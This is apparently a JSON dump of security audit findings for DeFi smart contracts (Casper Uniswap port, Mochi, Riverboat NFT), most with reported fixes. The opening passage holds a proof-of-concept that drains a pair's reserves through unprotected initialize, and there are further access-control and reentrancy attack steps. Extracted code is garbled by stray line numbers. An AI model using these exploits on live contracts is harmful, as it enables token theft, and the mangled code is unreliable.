:: new ( }, runtime_args! { & env , \" erc20 - token . wasm \" , \" token3_contract \" , attacker , runtime_args! { 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92  pair tokens as ( token2 - token3 )\" ); 93 94 95 96 97 98 99 100 101 token . initialize ( attacker , token2_package_hash , token3_package_hash , factory_hash , }, ); println! () ; println! (\" {}{:?}{} \" , \" 3. Attacker mints \" , amount1 , \" token2 -  token3 ( malicious tokens ) to pair \" ); 102 103 104 105 106 107 proxy . mint_with_caller ( owner , token2_contract_hash , Key :: from ( token . self_package_hash () ) , amount1 , ); 31 proxy . mint_with_caller ( owner , token3_contract_hash , Key :: from ( token . self_package_hash () ) , amount1 , ); println! () ; println! (\" {} \" , \" 4. Attacker calls pair - mint () to add liquidity 108 109 110 111 112 113 114 115 116  \" ); 117 token . mint_no_ret ( attacker , attacker ); // attacker adds  liquidity 118 println! (\" {}{:?} \" , \" Attacker 's pair balance ( liquidity tokens ) :  \" , token . balance_of ( attacker )) ; 119 println! (\" {}{:?} \" , \" Pair total supply : \" , token . balance_of (  token . self_package_hash () )) ; 120 121 122 println! () ; println! (\" {} \" , \" 5. Attacker calls pair . initialize () to set  pair tokens at token0 - token1 again \" ); 123 124 125 126 127 128 129 130 131 token . initialize ( attacker , token0_package_hash , token1_package_hash , factory_hash , ); println! () ; println! (\" {} \" , \" --- Balance of pair and attacker before  exploitation ( token0 - token1 ) ---\" ); 132 133  ) 134 135 136  ) 137 138 139 let balance_token0_attacker : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token1_attacker : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token0_pair : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 140 141 . unwrap_or_default () ; let balance_token1_pair : U256 = token1 32 142 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 143 144 145 . unwrap_or_default () ; println! (\" {}{} \" ,\" Attacker token0 balance (0) : \" ,  balance_token0_attacker ); 146 println! (\" {}{} \" ,\" Attacker token1 balance (0) : \" ,  balance_token1_attacker ); 147  ; 148  ; 149 150 151 println! (\" {}{} \" ,\" Pair token0 balance : \" , balance_token0_pair ) println! (\" {}{} \" ,\" Pair token1 balance : \" , balance_token1_pair ) println! () ; println! (\" {} \" , \" 6. Attacker transfers all pair tokens to pair  contract and then call burn to get token0 - token1 \" ); 152 token . transfer ( attacker , Key :: from ( token . self_package_hash () ) ,  token . balance_of ( attacker )) ; 153 154 155 156 token . burn_no_ret ( attacker , attacker ); println! () ; println! (\" {} \" , \" --- Balance of pair and attacker before  exploitation ( token0 - token1 ) ---\" ); 157 158  ) 159 160 161  ) 162 163 164 let balance_token0_attacker : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token1_attacker : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( attacker )) . unwrap_or_default () ; let balance_token0_pair : U256 = token0 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 165 166 167 . unwrap_or_default () ; let balance_token1_pair : U256 = token1 . query_dictionary ( \" balances \" , key_to_str (& Key :: from ( token .  self_package_hash () )) ) 168 169 170 . unwrap_or_default () ; println! (\" {}{} \" ,\" Attacker token0 balance : \" ,  balance_token0_attacker ); 171 println! (\" {}{} \" ,\" Attacker token1 balance : \" ,  balance_token1_attacker ); 33 172  ; 173  ; 174 175 println! (\" {}{} \" ,\" Pair token0 balance : \" , balance_token0_pair ) println! (\" {}{} \" ,\" Pair token1 balance : \" , balance_token1_pair ) println! (\" {} \" ,\" Attacker steals token0 - token1 from pair  reserves by creating dummy tokens \" ); 176 } Recommendation: It is recommended to add access control checks in order to restrict access to initialize function. Remediation Plan: SOLVED: The issue was solved in the commit 425c9 by implementing access control measures in the initialize function. 34 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "MISSING ACCESS CONTROL LEADS TO UNAUTHORIZED SETTING TREASURY FEE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the set_treasury_fee_percent inside the pair contract does not have any access control; therefore anyone can change the treasury fee. Attackers can use this vulnerability to lower the treasury fee while trading, or they can manipulate the treasury fee in order to harm other user transactions. Code Location: Down below is the code snippet from the set_treasury_fee_percent function: Listing 7: /pair/pair/src/pair.rs 920 921 922 923 924 925 926 927 928 fn set_treasury_fee_percent (& mut self , treasury_fee : U256 ) { if treasury_fee < 30. into () && treasury_fee > 3. into () { data :: set_treasury_fee ( treasury_fee ); } else if treasury_fee >= 30. into () { data :: set_treasury_fee (30. into () ); } else { data :: set_treasury_fee (3. into () ); } } Risk Level: Likelihood - 5 Impact - 5 35 Proof Of Concept: Listing 8 let ( _env , _proxy , _proxy2 , token , owner , _factory_hash ) = // owner sets normal treasury fee as 20 let treasury_fee : U256 = 20. into () ; token . set_treasury_fee_percent ( owner , treasury_fee ); assert_eq! ( token . treasury_fee () , treasury_fee ); 0 #[ test ] 1 fn poc_unauthorized_set_treasury_fee_percent () { 2  deploy () ; 3 4 5 6 7 8 9 10 11 12 13 14 15 } let attacker = _env . next_user () ; let new_treasury_fee : U256 = 3. into () ; // attacker sets unauthorizedly sets treasury fee as 3 token . set_treasury_fee_percent ( attacker , treasury_fee ); assert_eq! ( token . treasury_fee () , 3. into () ); Recommendation: It is recommended to add access control checks in order to restrict access to set_treasury_fee_percent function. Remediation Plan: SOLVED: The issue was solved in the commit b43db by implementing access control measures in the set_treasury_fee_percent function. 36 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "MISSING ACCESS CONTROL IN SWAP FOR FLASH LOANS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the swap function inside the pair contract does not implement any access control for flash loan/swap actions; therefore, any user can impersonate the flashswapper contract. There are two possible problems related to this misconfiguration. First, users can use flash loan/swaps without paying fees. Second, when the swap function used for flash loan/swap actions in the pair contract normally calls the flashswapper contracts uniswap_v2_call function to start the process, however when other users call the swap function, they can make the pair contract to call their own contracts and can control the application flow, and they can execute reentrancy attacks to steal tokens. To explain the second case vulnerability with an example; Consider a pair with liquidity: 1000 TokenA 1000 TokenB. 1. Attacker calls swap() with malicious contract with custom data to get 1000 TokenA get 1000 TokenB (Execution flow is transferred to malicious contract.) 2. Malicious contract calls Pair call sync() ( currently pair has: 0 TokenA 1000 TokenB) 3. Attacker transfers 500 TokenA 500 TokenB to pair 4. malicious contract calls mint() Code Location: Down below is the code snippet from the swap function: 37 Listing 9: /pair/pair/src/pair.rs 518 fn swap (& mut self , amount0_out : U256 , amount1_out : U256 , to :  Key , data : String ) { 519  ); 520 521 522 let pair_address : Key = Key :: from ( data :: get_package_hash () let zero : U256 = 0. into () ; if amount0_out > zero || amount1_out > zero { let ( reserve0 , reserve1 , _block_timestamp_last ) = self  . get_reserves () ; // gas savings 523 524 525 526 527 528 529 530 531  token0 { 532 533 if amount0_out < U256 :: from ( reserve0 . as_u128 () ) && amount1_out < U256 :: from ( reserve1 . as_u128 () ) { let token0 : Key = self . get_token0 () ; let token1 : Key = self . get_token1 () ; if to ! = token0 && to ! = token1 { if amount0_out > zero { // convert Key to ContractPackageHash // let token0_hash_add_array = match // // Key :: Hash ( package ) => package , _ => runtime :: revert ( ApiError ::  UnexpectedKeyVariant ) , 534 535 // }; // let token0_package_hash =  ContractPackageHash :: new ( token0_hash_add_array ); 536 let ret : Result <() , u32 > = runtime ::  call_versioned_contract ( 537 538  into () , 539 540 541 542 543 544 545 546 547 548 549 ...( snipped ) // token0_package_hash , token0 . into_hash () . unwrap_or_revert () . None , \" transfer \" , runtime_args! { \" recipient \" => to , \" amount \" => amount0_out }, // optimistically transfer tokens if data . len () > 0 { let uniswap_v2_callee_address : Key = to ; // convert Key to ContractPackageHash let  uniswap_v2_callee_address_hash_add_array = 550 551 match uniswap_v2_callee_address { Key :: Hash ( package ) = > package , 38 552 _ => runtime :: revert ( ApiError ::  UnexpectedKeyVariant ) , 553 554 555 }; let uniswap_v2_callee_package_hash = ContractPackageHash :: new (  uniswap_v2_callee_address_hash_add_array ); 556 557  call_versioned_contract ( let _result : () = runtime :: 558 559 560 561 uniswap_v2_callee_package_hash , None , \" uniswap_v2_call \" , runtime_args! { \" sender \" => data ::  get_callee_package_hash () ,\" amount0 \" => amount0_out , \" amount1 \" =>  amount1_out , \" data \" => data }, 562 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add access control checks to make sure other actors cannot use the swap function with setting a data parameter, expect the flashswapper contract. Remediation Plan: SOLVED: The issue was solved in the commit 4865e by removing flash-loan functionalities from the pair contract. 39 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "USERS CAN ADD MALICIOUS PAIRS TO FACTORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that when the add_liquidity function inside the uniswap -router contract is called with some pair_received parameter, it calls the create_pair function inside the factory contract, and as a result factory contract adds this pair contract hash to the list. However, this process also enables adversaries to add customized malicious pair contracts to the factory contract, which may be programmed to steal users tokens or similar. Code Location: Down below are code snippets from the create_pair and _add_liquidty functions: Listing router.rs (Lines 1074,1092-1101) 10: /uniswap-v2-router/uniswap-v2-router/src/uniswap_v2_- token_a : ContractPackageHash , token_b : ContractPackageHash , amount_a_desired : U256 , amount_b_desired : U256 , amount_a_min : U256 , amount_b_min : U256 , pair_received : Option < Key >, ) -> ( U256 , U256 ) { 1067 fn _add_liquidity ( 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 let factory : ContractPackageHash = data :: factory () ; let args : RuntimeArgs = runtime_args! { \" token0 \" => Key :: from ( token_a ) , \" token1 \" => Key :: from ( token_b ) }; let pair : Key = Self :: call_versioned_contract ( & factory . to_formatted_string () , uniswapv2_contract_methods :: FACTORY_GET_PAIR , 40 1084 1085 1086 1087 args , ); let zero_addr : Key = Key :: from_formatted_str ( \" hash  -0000000000000000000000000000000000000000000000000000000000000000 \"  , ) . unwrap () ; let mut pair_already_exist : bool = false ; 1088 1089 1090 1091 ...( snipped ) 1092 1093 if pair_already_exist == false { // need to call create_pair only once for each pair .  If a same pair is passed again , no need to call this again 1094 1095 1096 1097 1098 1099 1100 1101 1102 let pair = pair_received . unwrap () ; let args = runtime_args! { \" token_a \" => Key :: from ( token_a ) , \" token_b \" => Key :: from ( token_b ) , \" pair_hash \" => Key :: from ( pair ) }; let _ : () = Self :: call_versioned_contract ( & factory . to_formatted_string () , uniswapv2_contract_methods :: FACTORY_CREATE_PAIR ,  // this create_pair method DOES NOT create a new pair , instead it  initializes the pair passed in 1103 1104 1105 args , ); } Listing 11: /factory/factory/src/factory.rs (Lines 74,84,85) ...( snipped ) let _ret : () = runtime :: call_versioned_contract ( 74 fn create_pair (& mut self , token_a : Key , token_b : Key , pair_hash :  Key ) { 75 76 77 78 79 80  token1 , \" factory_hash \" => data :: get_package_hash () } , 81 82 83 84 85 pair_package_hash , None , \" initialize \" , runtime_args! { \" token0 \" => token0 , \" token1 \" => // handling the pair creation by updating the storage self . set_pair ( token0 , token1 , pair_hash ); self . set_pair ( token1 , token0 , pair_hash ); ); 41 86 87 88 let mut pairs : Vec < Key > = get_all_pairs () ; pairs . push ( pair_hash ); self . set_all_pairs ( pairs ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to redesign the application to not allow users to add arbitrary pair hashes to factory contract. Remediation Plan: SOLVED: The issue was solved in the commit 04f45 by implementing an access control measure which only gives permission to white listed accounts to use this function. 42 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Critical"
        ]
    },
    {
        "title": "MISSING REMOVE PAIR FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed the factory contract does not implement a remove pair feature, and since the application logic allows anybody to register their pair contracts, it is crucial to implement a remove pair functionality to remove any malicious or unwanted pairs from the factory. Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add a remove pair function to the factory contract. Remediation Plan: SOLVED: The issue was solved in the commit 65fe2 by implementing a remove_pair function. 43 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Medium"
        ]
    },
    {
        "title": "PAIR SWAP FUNCTION IS RE ENTRANT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the swap function, inside the pair contract, does not have a protection against reentrancy attacks, which makes it vulnerable to attacks such as HAL-05. Code Location: Down below is the code snippet from the swap function: Listing 12: /pair/pair/src/pair.rs 518 fn swap (& mut self , amount0_out : U256 , amount1_out : U256 , to :  Key , data : String ) { 519  ); 520 521 522 let pair_address : Key = Key :: from ( data :: get_package_hash () let zero : U256 = 0. into () ; if amount0_out > zero || amount1_out > zero { ...( snipped ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a reentrancy guard to the swap function, like the skim and sync functions. 44 Remediation Plan: SOLVED: The issue was solved in the commit 623ce4ab3d8e19436cd709999beb80da9d871e28 by implementing a reentrancy guard to the swap function. 45 ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PAUSE FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Casper Smart Contract Audits/Rengo_Labs_Uniswaap_Core-Router_Casper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the pair contract does not have a pause functional- ity, which makes it harder to remediate if a critical vulnerability is discovered or a critical situation occur. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a pause functionality to the pair contract. Remediation Plan: SOLVED: The issue was solved in the commit 33219 by implementing pause functionality in the pair contracts. 46 3.10 (HAL-10) PAIR TOKEN BALANCES MAY MANIPULATE EACH OTHER WHEN A TOKEN CONTRACT USED FOR MANY PAIRS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Rengo_Labs_Uniswaap_Core-Router_Casper",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER KEY MANAGEMENT POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "A fundamental principle of blockchain is decentralization which should be applied as widely as possible in all areas, including key management. Using a single private key to manage a smart contract and perform privi- leged actions such as deploying or upgrading the contract is risky. If the private key is compromised, it could have devastating consequences. For example, on March 5, 2021, the PAID Network smart contract was suc- cessfully attacked despite the smart-contract being previously audited. Approximately $100 million of PAID tokens were extracted by the attacker. In that case, the private key was compromised and the attacker upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Had best practices been imple- mented in the key management policy, the attacker could not have upgraded the contract using a single private key. Requiring multiple signatures in the key-management policy prevents a single user from performing any critical actions. Reference: https://halborn.com/explained-the-paid-network-hack-march -2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: Require multiple signatures in the key-management policy to avoid a private-key compromise resulting in loss of control over the smart con- tract. 12 Remediation Plan: Solved: MOCHI team will use a multi-signature wallet for the deployment to the mainnet. 13 ",
        "labels": [
            "Halborn",
            "Mochi",
            "Severity: Critical"
        ]
    },
    {
        "title": "BLOCK TIMESTAMP ALIAS USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Reference: Avoid using now Code Location: MOMA.sol Line #49 #67 #68 #77 #104 #133 #135 14 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: MOCHI team assumes that the use of block.timestamp is safe because their timescales are higher than 900 seconds. 15 ",
        "labels": [
            "Halborn",
            "Mochi",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the contract MOMA.sol, the return value in withdrawERC20 is being ignored. Code Location: MOMA.sol Lines #179-183 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add a return value check to avoid an unexpected crash of the contract. A return value check will help handle exceptions more thoroughly. Remediation plan: team MOCHI issue solved d3d80e892e7ec58cf035311ada98478a8 the in their last commit 9435238 16 ",
        "labels": [
            "Halborn",
            "Mochi",
            "Severity: Low"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Reference: Solidity Optimizer and ABIEncoderV2 Bug Code Location: MOMA.sol Line #3 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 2 17 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). Remediation Plan: Risk Accepted: MOCHI team accepts the risk of using experimental features because they want to use the latest stable and tested version of pragma (0.6.12). 18 ",
        "labels": [
            "Halborn",
            "Mochi",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Mochi_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Moma.sol Line #53 #179 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be 19 called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remmediation plan: team issue solved MOCHI d3d80e892e7ec58cf035311ada98478a8 the in their last commit 9435238 20 3.6 MANUAL TESTING ",
        "labels": [
            "Halborn",
            "Mochi",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTRACT ADMIN CAN REVOKE AND RENOUNCE HIMSELF",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Owner of the contract is usually the account which deploys the contract. In the RiverboatFactory.sol smart contract, Only Admin can perform some privileged actions such as setNft, addStaticUser, removeStaticUser etc. . . , the addAdmin function is used to add an Admin role, and the renounceAdmin function is used to renounce being an Admin. It was observed that admin can revoke his role via renounceAdmin. If an admin is mistakenly renounced, administrative access would result in the contract having no admin, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. PoC Steps:  Deploy a RiverboatFactory using the owner address.  Execute riverboatfactory.renounceAdmin() function as using the owner address. 13 Code Location: Listing 1: contracts/RiverboatFactory (Lines 43) 43 44 45 function renounceAdmin () public virtual { renounceRole ( DEFAULT_ADMIN_ROLE , msg . sender ); } Risk Level: Likelihood - 3 Impact - 5 Recommendations: It is recommended that the contract Admin cannot call renounceAdmin without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceAdmin function should be confirmed for two or more users. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 14 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: High"
        ]
    },
    {
        "title": "IMPROPER ACCESS CONTROL POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the smart contracts, implementing a correct Access Control policy is essential to maintain security and decentralization of permissions The features to mint/burn tokens and pause contracts are on a token. given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to keep the principle of least privilege, also known as least authority. Briefly, any process, user, or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in simple systems, but more complex projects require the use of more roles using Role-based access control. The mintType function on RiverboatFactory have no restrictions and can be called by any user. An adversary could leverage this to mint NFTs instead of buying. PoC Steps:  Deploy a RiverboatFactory and RiverboatNft using the owner address.  Call function setFactory and provide address of the RiverboatFactory using owner user address.  Execute mintType function using any user address. 15 Code Location: Listing 2: contracts/RiverboatFactory (Lines 24) 24 25 26 27 function mintType ( address _owner , uint256 _type ) public returns ( uint256 ) { require ( _type < 5, \" invalid type \" ); return nft . mint ( _owner , _type ); } Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to limit the function with an appropriate modifier, which will allow only authorized users to execute the function. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 16 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Every There is no validation of the addresses anywhere in the code. address should be validated and checked that is different from zero. This issue is present in all the smart contracts, in the constructors and functions that use addresses as parameters. Some code location examples: RiverboatFactory.sol Listing 3: RiverboatFactory.sol 145 146 147 function setNft ( address _nft ) public onlyAdmin { nft = RiverboatNft ( _nft ); } RiverboatNft.sol Listing 4: RiverboatNft.sol 56 57 58 function setFactory ( address _factory ) public onlyOwner { factory = _factory ; } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that every address input is different from zero. 17 Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 18 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Low"
        ]
    },
    {
        "title": "USAGE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During a manual static review, the tester noticed the use of now and block.timestamp. The contract developers should be aware that this does not mean current time. block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 5: contracts/RiverboatFactory (Lines 121) 115 116 117 118 119 120 121 122 123 124 125 } if ( sessionId > 0) require ( isFinished ( sessionId ) , \" last session hasnt finished yet \"); require ( _currencyAddress != address (0) , \" invalid currency address \" ); require ( _nftAddress != address (0) , \" invalid nft address \"); require ( _startPrice > 0, \" start price can 't be 0 \" ); require ( _priceIncrease > 0, \" price increase can 't be 0 \" ); require ( _startTime > block . timestamp , \" session should start in future \" ); require ( _intervalDuration > 0, \" interval duration can 't be 0 \"); require ( _intervalsAmount > 0, \" intervals amount can 't be 0 \" ); require ( _slotsAmount > 0, \" slots amount can 't be 0\" ); Listing 6: contracts/Riverboat 1 contracts / Riverboat . sol :234: uint256 _currentInterval = ( now - sessions [ _sessionId ] 2 contracts / Riverboat . sol :262: if ( now >= session . startTime && now < session 19 3 contracts / Riverboat . sol :274: if ( now > session . startTime + session . intervalsAmount * session . intervalDuration ) Risk Level: Likelihood - 2 Impact - 3 Recommendations: Use block.number instead of block.timestamp or now reduce the influence of miners. If possible, Its recommended to use Oracles. Remediation Plan: NOT APPLICABLE: The Seascape claims that the timescales is higher than 900 seconds. 20 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Riverboat contract Riverboat.sol, RiverboatFactory.sol and RiverboatNft. sol uses the floating pragma ^0.6.7. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 7: Riverboat.sol 1 pragma solidity ^0.6.7; Listing 8: RiverboatFactory.sol 1 pragma solidity 0.6.7; 2 Listing 9: RiverboatNft.soll 1 // Riverboats NFT 2 // SPDX - License - Identifier : MIT 3 pragma solidity 0.6.7; Risk Level: Likelihood - 1 Impact - 3 21 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 22 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Low"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value Code Location: Listing 10: contracts/Riverboat (Lines 126) 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 function startSession ( address _currencyAddress , address _nftAddress , address _lighthouseTierAddress , uint256 _startPrice , uint256 _priceIncrease , uint32 _startTime , uint32 _intervalDuration , uint32 _intervalsAmount , uint32 _slotsAmount ) { external onlyOwner if ( sessionId > 0) require ( isFinished ( sessionId ) , \" last session hasnt finished yet \"); require ( _currencyAddress != address (0) , \" invalid currency address \" ); require ( _nftAddress != address (0) , \" invalid nft address \"); require ( _startPrice > 0, \" start price can 't be 0 \" ); require ( _priceIncrease > 0, \" price increase can 't be 0 \" ); require ( _startTime > block . timestamp , \" session should start in future \" ); 23 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 require ( _intervalDuration > 0, \" interval duration can 't be 0 \"); require ( _intervalsAmount > 0, \" intervals amount can 't be 0 \" ); require ( _slotsAmount > 0, \" slots amount can 't be 0\" ); sessionId ++; sessions [ sessionId ] = Session ( _currencyAddress , _nftAddress , _lighthouseTierAddress , _startPrice , _priceIncrease , _startTime , _intervalDuration , _intervalsAmount , _slotsAmount ); We have located unsafe usage of arithmetical operations in many places in the contract: Listing 11: contracts/Riverboat 1 contracts / Riverboat . sol :252: uint256 _currentPrice = sessions [ _sessionId ]. startPrice + sessions [ _sessionId ] 2 contracts / Riverboat . sol :253: . priceIncrease * _currentInterval ; 3 contracts / Riverboat . sol :263: . startTime + session . intervalsAmount * session . intervalDuration ){ 4 contracts / Riverboat . sol :274 if ( now > session . startTime + session . intervalsAmount * session . intervalDuration ) Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Remediation Plan: ACKNOWLEDGED: Since sessionId is type uint256, the likelihood of reaching 1077 is very low. Therefore, overflow is highly unlikely. 25 ",
        "labels": [
            "Halborn",
            "Seascape_Riverboat_NFT",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED IMPORT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
